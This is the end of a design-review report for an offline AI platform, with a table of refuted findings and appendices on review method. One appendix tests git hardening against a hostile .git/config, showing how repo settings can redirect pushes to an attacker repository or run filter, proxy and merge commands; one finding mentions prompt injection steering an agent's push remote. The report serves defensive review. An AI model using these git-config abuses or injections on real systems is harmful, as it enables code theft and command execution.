| AC cycle on a dual-feed server may not power the unit off and VERIFY would compare an uncycled server | Refuted: whether a target has redundant feeds is target inventory settled with the real hardware in P8, and an AC cycle that never dropped power is already visible deterministically (the BMC does not reboot, no SEL reset, fence markers stay contiguous). An im… |
| No BMC-ready timeout after an AC cycle; SOL/syslog re-attach unspecified | Refuted: the guardrail list in §10.2 is illustrative and SETTLE already waits on SOL/SSH with a timeout; a BMC-ready timeout and SOL re-attach follow directly from the glossary's 'AC cycle (BMC cycles too)' and are P7 state-machine details, not an unsettled d… |
| Syslog on 0.0.0.0:5514 and SOL are unauthenticated inputs without source binding or provenance | Refuted: the receiver sits on the lab VLAN shared only by the executor and its targets, attributing lines to the leased target by source address is an implementation necessity for concurrent runs, and redaction before model context is already INV-5 plus confi… |
| 'SOL + syslog on' implies reconfiguring the target's log forwarding; scope and revert undefined | Refuted: how the target forwards syslog (an executor-written drop-in over SSH or lab pre-configuration) is an inband-driver detail settled with the real target in P8, and every executor-made step on the target is already journalled by the state machine. No co… |
| SN mismatch between label and unit has no rule; the SN may be typed | Refuted: 'match the label' is a deterministic template step, so a mismatch is a failed step that follows §10.3's FAIL path (station held, line-lead ticket), and comparison by `assert` is code per INV-3. Barcode scanners are keyboard wedges, so 'scan or type' … |
| Retest of the same SN has no lineage; dedup could swallow the second failure | Refuted: every job is its own T-factory ticket with the unit SN bound to it (§10.3), and fingerprint dedup applies to bug tickets spawned from findings, not to job tickets, so a second failure of the same SN still produces a job ticket in FAIL; MES tracks att… |
| The unit can be swapped after the SN-match step; the verdict is returned without re-reading the SN | Refuted: templates are site-owned (Factory/Templates) and a final SN re-read is a template step the line adds; the SSOT does not prevent it and the operator is physically present at the station. Speculative as a design defect. |
| 'Signed step batches' names no signer key, expiry or replay protection | Refuted: the signing scheme is a P9 implementation detail behind a stated design intent; nothing contradicts it and the runner fake will pin it down. A one-line field list is a nit, not a design gap. |
| The file-drop MES adapter has no location, schema or trust boundary | Refuted: open decision (8) parks the MES integration method, the drop location's ACL is the site's trust boundary for an internal MES, and schema plus dedup are natural P9 adapter deliverables. Only the missing inbox path in §4.4 is a nit. |
| Direction of the runner RPC (station listens versus dials out) is undefined | Refuted: connection direction is a P9 engineering choice with no conflicting passage; 'station runner client' already leans toward the executor as the RPC client. Worth one sentence when the runner is designed. |
| The runner's OS privilege level on the station is undefined | Refuted: the OS account the runner uses on a Windows/Linux station depends on the vendor tool and is settled with the real station in P10; nothing contradicts it. A non-admin default is good practice worth one sentence, not an unsettled design decision. |
| Bundle size is unbounded (likely 0.4–1+ TB) with no size budget, split format or CI-sized profile | Refuted as a design defect: nothing in the docs asserts a size, model choice is open decision (2) and a hardware/business matter, and P1's login-page test (compose has no inference service in P1) is feasible with a core bundle. Archive format is a bundle-buil… |
| Quantisation depends on the customer's GPU generation, but the bundle is built before that is known; BF16 reference count ambiguous | Refuted as a design defect: a packaging decision without a contradiction, and outside P0/P1; the BF16 wording is genuinely ambiguous but a nit-level tightening folded into #6/#4. |
| No SBOM, vulnerability scan or security-update runbook: a site cannot know its exposure or receive a CVE fix | Refuted: supply-chain hygiene the docs neither claim nor contradict; no invariant is broken. The one actionable remnant — a delivery route for a fixed image — is fresh-bundle#9's `slas upgrade`. |
| 'copy models' plus 'Idempotent' has no skip, move or verification rule for hundreds of GB | Refuted: an install.sh implementation detail, not a design gap; the skip/verify criterion falls out of the manifest from #8 and the disk check from #3. |
| .gitignore does not exclude model weights, bundle archives or git bundles | Refuted: `git check-ignore` confirms these paths are not ignored, but nothing in the design puts them in-tree; hygiene, not a defect. Cheap to add with #22. |
| .gitignore *.pem and *.key at any depth will ignore deliberate test fixture certificates and keys | Refuted: P6b's own CI check greps every sink for private-key patterns and would fire on committed test keys; ephemeral per-run keys are the correct design, and the unanchored *.pem/*.key rule is then defence in depth. `git check-ignore` confirms tests/fixture… |
| Footer shows 'Version 2.0' for a pre-Phase-0 product whose design is at 3.1 | Refuted: sample data value; it contradicts no decision (CLAUDE.md never defines a product version string). |
| Dead duplicate 'Review and approve' dialog with different figures than the wizard | Refuted as mock cruft: verified the function is defined at 750 and never called, so it contradicts no decision and no user sees it. |
| Import result reports only 'schema valid'; capability check and risk class are not shown | Refuted: the §5.6 import-time display rule is triggered only by destructive primitives, which the sample lacks; a one-line success summary is a legitimate mock simplification. |
| Skills table 'Kind: Commands' for a skill that requires only Redfish | Refuted: sample data value in a display column; contradicts no decision. |
| Voters vote in live cross-checks while the Models page shows them as not serving | Refuted: simulation shortcut (servingIds() is a mock helper) and the underlying question is already an acknowledged open decision. |
| Demo voters share a base family: Kimi Dev 72B is a Qwen2.5 fine-tune | Refuted: sample model names that mirror §5.3's own example list; out of this lens. |
| Rerank role can never be assigned in the demo UI | Refuted: sample-data gap, not a contradiction; the §7 role set is rendered. |
| FP8 and AWQ models mixed on one 4×80 GB GPU class | Refuted: sample data; §7 is guidance, not a constraint the demo breaks. |
| Sandbox isolation selectable in Admin and per task regardless of install profile | Refuted: the per-task control is prescribed by §9; the available options are sample values, not a contradiction. |
| History panel explains agent commits with Git trailer names | Refuted: cosmetic; the copy is a sentence, not an enum, and matches §5.7. |
| Interactive chips, rows and list items are not keyboard-operable | Refuted as a simulation shortcut: markup mechanics of the mock, not a decision it contradicts. |
| Vote rendering has two states; the fixed schema has three | Refuted as a simulation shortcut in sample data; no decision contradicted. |
| Bundle export is named per ticket and downloaded, not saved per project under Bundles/ | Refuted: sample data value; no §4.4/§5.7 decision is contradicted by a download link. |
| Canonical vote sentence shows bare codes (EE, S1, S2); demo uses a different sentence | Refuted: no §9 rule is actually broken; wording variance between an SSOT example and a mock is cosmetic. |
| docs/glossary.yaml does not exist yet is cited as present; ownership (repo vs data root, who edits) undefined | Refuted: a planned artefact in a pre-Phase-0 repo is not a defect, and no decision says the glossary must be editable at runtime. |
| How code 'copies identifiers' inside model-translated prose is unspecified | Refuted: implementation detail with a stated requirement and test; no contradiction. |
| `slas_sop_exports_total{lang}` counts per-language exports, contradicting atomic both-or-neither export | Refuted: metric label design, not a decision conflict; divergence would surface a violation, which is useful. |
| Skill schema language fields: `sop_summary` may carry one language; `name`/`description` are single-language yet appear in SOPs | Refuted: speculative reading of a schema that already shows both fields; no contradiction. |
| Demo's zh SOPs use two terms for 'ticket' (工單 / 問題單); glossary example covers no platform nouns | Refuted: the two terms map to two distinct concepts and no decision is contradicted. |
| What the Factory agent returns to MES (verdict only, one language, both) is unstated | Refuted: covered by an acknowledged open decision; no contradiction. |
| Wizard step names and Git sub-tab label drift between §9 and the demo | Refuted: cosmetic wording variance. |
| Operations over 5 s without live progress: Pull, Fetch, bundle import/export, Back up now | Refuted: simulation shortcut; the rule exists and the pattern is demonstrated elsewhere in the same mock. |
| Dialogs: no focus trap, no label, focus not returned; progress dialogs re-render every 900 ms; Escape/scrim discards a filled wizard | Refuted as an implementation shortcut of the mock. |
| §15 lists as open five decisions the body already makes (PDU, .xlsx parser, search option, MES adapter, zh-Hant) | Refuted: the body explicitly labels these as defaults ('Option A (default)', 'Default Chinese is…', `MES_ADAPTER: file_drop`, `SEARCH_MODE: internal_corpus`), and DEVELOPMENT_PLAN P8 line 128 builds the 'PDU driver (per open decision 3)', so the pattern 'prov… |
| `wait` allows 3600 s while the default whole-skill timeout is 900 s | Refuted: `timeout_s` is a per-skill setting with a default, so a skill that waits 3600 s simply sets `timeout_s` higher; a maximum per step above a default per skill is not a contradiction. The suggested check is a nice-to-have. |
| INV-1 lists 'CA, NTP' as banned categories although internal TLS/mTLS need a CA and a clock | Refuted: INV-1 is explicitly 'No external network dependency', so CA and NTP are listed as categories of external dependency, not banned outright; DEVELOPMENT_PLAN P1 (line 40) and PROMPTS (line 57) already specify self-signed TLS for edge and PROMPTS line 19… |
| INV-6 has no named test and no fsync/guard rule for the write-ahead journal | Refuted: the reviewer could not read the plan; DEVELOPMENT_PLAN P2 (line 52-54), P7 (line 124) and PROMPTS P2 (line 71-72) all name journal crash-recovery tests as done-criteria. The fsync and HAL-guard suggestions are hardening, not a documented gap. |
| 'No shell primitive' is weakened because run/ssh argv can be ["sh","-c",...] | Refuted: the text claims exactly what it delivers (no primitive that takes a shell string; strings never joined); `run`/`ssh` are already classed caution precisely because they execute arbitrary programs. The interpreter classifier is a design suggestion, not… |
| Quickstart has no durable service-log sink beyond json-file rotation | Refuted: the 'who pushed this?' audit question is answered by the audit rows in §5.7, Loki is deliberately prod-scoped in §3, the compose blueprint is explicitly conceptual, and exhaustion of 250 MB of structured logs within 72 h is speculative. |
| Screen-worker capacity (8 displays) has no admission-control or scale-out rule | Refuted: the central scenario is wrong because factory GUI steps never use Zone S; the residual (9th-session behaviour) is a small UX detail a phase can settle. |
| install.sh 'wait healthy' lacks healthcheck definitions and a testable INV-10 criterion | Refuted: P1 and its prompt define the CI criterion (login page loads on a fresh VM under egress-DROP) and P1 contains no vLLM to wait for; §12 is explicitly conceptual, so missing healthcheck stanzas are an implementation detail, not a spec gap. |
| 24-hour model rollback does not say whether the incumbent stays resident or is reloaded | Refuted: 'draining' plus 'kept for 24 hours' reads consistently as weights and registry entry retained on disk, and the demo's fit sentence already distinguishes both-fit from unload-first; only a clarifying clause is missing, not a decision. |
| The remote for a coding run can be chosen by the agent via `remote_ref` and redirected by prompt injection | Refuted as speculative: the export target is chosen by the user in wizard step 2 (599), the push is a user action 'Push to <remote>' (627; demo 492/512 lets the user pick the remote at push time), and remotes are owned per user (424) so the worst case is anot… |
| Kernel schemas Job, Plan, Step, Observation, Verdict, SopTemplate, Finding are named but nowhere defined | Refuted: the plan explicitly assigns designing these schemas to P2 (line 48-49) and §15 requires the interface to be written back; designing them is the P2 deliverable, not a guess. Only drift: Observation, Verdict and SopTemplate are missing from the P2 list. |
| Vote schema `fields: {...}` is undefined per decision type | Refuted: the plan (line 59-60) and PROMPTS P3 (line 82) place per-decision rules in config/consensus.yaml, which P3 defines; the demo supplies the severity value domain (S1-S3). The open `{...}` is the generic envelope, a normal P3 detail. |
| `run` has no way to choose sandbox vs target; for Validation/Factory it would execute in the executor container | Refuted: §5.2 lines 309-311, the 'Needs' column (files for sandbox, ssh for target) and demo line 1032 all give the default — run executes on the job's machine, never on the platform. The missing `target` arg is implied by the job's leased target. |
| `sel_snapshot`/`inventory_snapshot` duplicate `redfish get_sel`/`get_inventory` with different transports | Refuted: the 'Needs' column already distinguishes raw Redfish from a normalised redfish/ssh snapshot; the Validation baseline is a plan primitive owned by P7 (DEVELOPMENT_PLAN line 115), not a skill primitive. Design taste. |
| Skill-wide `on_failure: retry` re-executes destructive primitives without a new approval or settle time | Refuted: approval is per run, not per action (INV-7 line 101), skill steps expand into executor steps (line 265) that the executor's guardrails and journal already bound, and DC power is not on the approval list. Retry scope is a normal P4 detail; a clarifyin… |
| `wait` ≤ 3600 s and foreach ≤ 100 can exceed the 900 s default skill timeout; no validation rule | Refuted: the wall-clock timeout is the defined behaviour; a static check is a nice-to-have the P4 implementer may add. Not a decision the spec must make. |
| 'if plan is critical → Consensus Router' — 'critical' is undefined | Refuted: the §5.3 table (line 322-323) is the definition — Validation and Factory plans are cross-checked, Coding is checked on the final diff (§10.1 line 621, demo toggle line 1165). Only the word 'critical' is loose. |
| Coding loop: max_iterations default and 'no progress' definition are missing | Refuted: the demo gives the default (12 iterations, line 1178) and the plan assigns stall detection to P6 (line 94); the progress metric is an algorithmic detail of that deliverable. |
| ZIP export contents and walkthrough format are unspecified | Refuted: the walkthrough's content is defined at line 622 and its shape is SopModel (§5.5); the ZIP is a working-tree archive by any reasonable reading. Normal P6 detail. |
| Consensus 5% token budget degrades Factory PASS to 'single model' which cannot satisfy the 3/3 PASS rule | Refuted as ambiguity: the behaviour is fully specified and consistent — a degraded single vote is not 3/3, so 'line lead decides' (line 325) applies, which is the designed fallback, not a block. Whether to exempt factory verdicts is a policy choice for consen… |
| Validation/Factory plan primitives are never enumerated, though INV-7 and the compiler depend on them | Refuted: the plan explicitly assigns plans/primitives to P7 (line 115) with constraints already given (guardrail names, §10.2 cycle phases, §14 glossary verbs, demo suite items). Designing the verb list is the P7 deliverable, like the schemas in #1. |
| .xlsx suite column schema undefined although the compiler must parse it | Refuted: the default is stated — 'LLM as compiler, once' (line 634) with parsed items confirmed by the user (line 600); §15 (5) already tracks the parser alternative and the demo sketches the columns. Not a guess the P7 implementer must make. |
| 'Session' (screen worker, sandbox Container/<session>) is never related to ticket or run | Refuted: line 439 and demo line 584 bind the sandbox/terminal session to the ticket ('the sandbox for C-1187'); the TTL value is a P6 setting (DEVELOPMENT_PLAN line 89 lists TTL in scope). A one-line clarification would help but no decision is missing. |
| sandbox-manager exec API referenced but not defined | Refuted: an internal service API is a normal P6 implementation detail; the security-relevant constraints are already in the SSOT (line 440, 439, 503). |
| Git identity `<user>@slas.local` conflicts with OIDC users who have real emails | Refuted: a default is given and works; `<user>` is plainly the username. Whether to prefer an OIDC email claim is a P12 policy nicety, not an ambiguity that blocks P6. |
| No Project schema: how the broker maps Projects/<slug> to owner, remote and authz is undefined | Refuted: ownership is already encoded — projects live under Coding/<user>/ and Remote carries `owner` with 'own remotes' capability wording; deriving path and authz from the authenticated caller is the natural P6b implementation. A formal Project model is P6 … |
| Ticket ID format drifts: T-xxxx, T-<agent>-<seq>, T-coding-n | Refuted: within CLAUDE.md the three forms are one format — a placeholder (T-xxxx), the pattern (T-<agent>-<seq>, which fixes per-agent sequences) and an instance (T-coding-n). Padding is an implementation detail. The real drift is the demo's C-/V-/F- prefixes… |
| `copy` paths and `path` inputs have no root or traversal rule | Refuted: 'within the job's workspace' is stated twice and §4.4 names each agent's workspace directory; rejecting traversal is the standard implementation of that constraint, not a missing decision. |
| No Target/Station schema or registry for `target_ref`, leases and 'pick a free server' | Refuted: the admin flow exists in the demo (Admin → Servers, lines 1053-1059, with lease state) and PROMPTS (Admin → Stations, line 190); leases are an API responsibility (line 166). The Target model is P7 data-model design; only a mention in §9 is missing. |
| Approval object, approver capability and self-approval rule are undefined | Refuted: scope is per run (INV-7 line 101); the demo shows scoped approval rights per role ('Can approve … rack 2 and rack 3') and self-approval as the normal path ('Approved by you'); rbac-roles.yaml is a P1 deliverable. The record shape is P2 design. |
| Skill `requires` names do not match the capability namespace used by slas-authz | Refuted: the capability catalogue is P1's config deliverable (PROMPTS line 58); skill `requires` is a deliberately simple author-facing vocabulary (demo line 1006 explains 'screen') that P4 maps. Naming detail. |
| `Agent.verify()` timing and effect on the run are undefined; must be deterministic for Validation | Refuted: the signature (step, observation) implies per-step invocation, 'zero LLM' (line 637) already forbids model calls in Validation ACT, and a failing verdict feeding on_failure (line 391) is the natural reading. P2 detail. |
| Journal (INV-6) has no home in the ticket schema | Refuted: the journal's phases are fixed by INV-6, its location by §4.4, and its implementation (with crash recovery) is explicitly P2's deliverable. Record shape is a normal P2 detail. |
| Wizard 'isolation' option for coding tasks is undefined | Refuted: the demo defines the option (gVisor default, Kata/Firecracker) at lines 1163 and 1067, matching §3's sandbox tiers. |
| Export target chosen in the wizard implies an automatic push that §10.1 describes as a user click | Refuted: the demo states the default directly ('Nothing is pushed to Git until you approve', line 1170) and §10.1 frames push as the user's action; the wizard choice is a pre-selection. |
| Factory 'event log must be empty' does not say which log | Refuted as a spec ambiguity: which log the line checks is content of a factory template (data owned by P9, line 135), not platform code; the demo already classes the step as an SSH command step. The owner should state the source in the template. |
| Skill `name`, `description` and `sop_summary` allow single-language values, so Skills page and skill-derived SOP text can be English-only | Refuted: `sop_summary` at 476 is typed `{ en: string, zh: string }`, so a schema generated from §6.1 requires both when the object is present, and 'kernel generates if absent' covers the missing case. `name`/`description` are UI labels whose language policy i… |
| Agent commit trailers and isolation runtime names will leak into user-facing panels with no display rule | Refuted by the demo: the History panel (554-555) renders agent commits as 'message — Coding agent [Agent, C-1187]' and mentions trailers only in an explanatory note; raw trailers appear only in the terminal's `git log` output (608), which is git's own text. I… |


## Appendix A. Method

Scope: `CLAUDE.md` v3.1, `docs/DEVELOPMENT_PLAN.md`, `docs/PROMPTS.md`, `README.md`,
`docs/ui-demo/slas-ui-demo.html`, `docs/adr/0000-template.md` and `.gitignore`, as committed in
`58d0408` ("init commit"). No code exists yet, so this is a review of the design, not of an
implementation.

Procedure:

1. Eighteen independent reviewers, each with one lens, read the documents and reported findings
   with file and line citations. Lenses: CLAUDE.md internal consistency; cross-document consistency;
   invariant wording and enforcement; security threat model; technical feasibility of the named
   tools; plan sequencing and coverage; specification ambiguity; operability; UI demo against the
   specification; WebUI copy and dual language; data lifecycle and retention; runtime state and
   crash recovery; the shop floor and lab as stakeholders; the offline bundle and supply chain;
   PROMPTS.md, the ADR template and `.gitignore`.
2. Every finding was then re-checked by a separate verifier against the actual files (line numbers
   taken from the file, not from the reviewer), with the instruction to default to "refuted" when
   uncertain. Verifiers re-assigned severity, marked within-lens duplicates, and tightened the fix.
   Where a finding made a claim about `git`, the verifier reproduced it with git 2.43.0.
3. Confirmed findings from all lenses were clustered by root cause, so one defect that several
   reviewers saw appears once, with every location they cited.
4. The rejected findings are listed in section 7 so the reader can see what was checked and not
   reported.

Severity scale used throughout: **blocker** contradicts an invariant in §2, is a security flaw, or
makes a phase unimplementable as written; **major** two parts of the documents disagree on a
decision that changes code, or an implementer must guess such a decision; **minor** a stale
reference, naming drift or small gap; **nit** wording.

## Appendix B. Evidence: the §5.7 hardening flags against a hostile `.git/config`

Reproduced with git 2.43.0. The script simulates a sandbox that can write
`Projects/<slug>/.git/config` (which §5.7 Method 2 grants) and runs the broker's git with the flags
from §5.7 Method 1. Each check is one repository under a scratch directory; nothing touches a real
remote.

| # | Check | Result |
|---|---|---|
| 1 | Run any git command with the exact flag list from §5.7 line 426, which includes `-c include.path=` | git aborts: `error: relative config includes must come from files` / `fatal: unable to parse command-line config` |
| 2 | Without that flag, is a repo-level `[include] path=…` in `.git/config` still followed? | Yes. A value set only in the included file is returned by `git config` |
| 3 | Does `-c credential.helper=` stop a helper configured in `.git/config`? | Yes, the repo helper did not run |
| 4 | Does `core.hooksPath=/var/empty` stop a `pre-push` hook? | Yes, the hook did not run |
| 5 | Does a repo-configured `url.<base>.insteadOf` redirect the broker's push? | Yes. With `origin` set to `https://gitlab.internal/…`, the push landed in an attacker-controlled repository |
| 6 | Do repo-configured `filter.<d>.smudge` and `diff.<d>.textconv` commands run under the remaining flags? | Yes, on checkout (the pull path) and on `git diff` (a gate path) |
| 7 | Does `-c core.sshCommand=` suppress a repo `core.sshCommand`, and does `GIT_SSH_COMMAND` still win? | Yes and yes; this part of the design works |
| 8 | Repository owned by a different uid than the broker | `fatal: detected dubious ownership`; `-c safe.directory=*` makes it work and removes git's own protection against exactly this hazard |
| 9 | A fresh broker-side clone of the hostile repository | Nothing ran. Filter definitions live in `.git/config`, which a clone does not inherit; clone is safe, pull and diff into the shared repository are not |

The verifier for the security lens extended the script and additionally observed: `remote.origin.pushurl` redirected `git push origin`; `core.gitProxy` executed its command when a URL was rewritten to `git://`; a repo-configured merge driver ran during a broker-style pull that merged; replacing `Projects/<slug>/.git` with a symlink or a `gitdir:` file pointing at another user's repository made the broker's git read that user's commits.

Two further empirical checks:

- `GIT_ASKPASS` with a URL that carries no username is invoked twice, first for `Username for 'https://gitlab.internal':` and then for the password. §5.7 describes a helper that returns the PAT only.
- `git check-ignore` confirms the `.gitignore` patterns `Models/`, `Backups/` and `data/` match at any depth: `docs/Models/readme.md`, `packages/slas-kernel/Models/x.py`, `services/git-broker/data/x` and `tests/deploy/Backups/x` are all ignored. `!config/.env.example` correctly re-includes that file.

The script is committed next to this report as `git-hardening-check.sh`; run it with `sh git-hardening-check.sh` (needs only git; everything happens under a temporary directory).
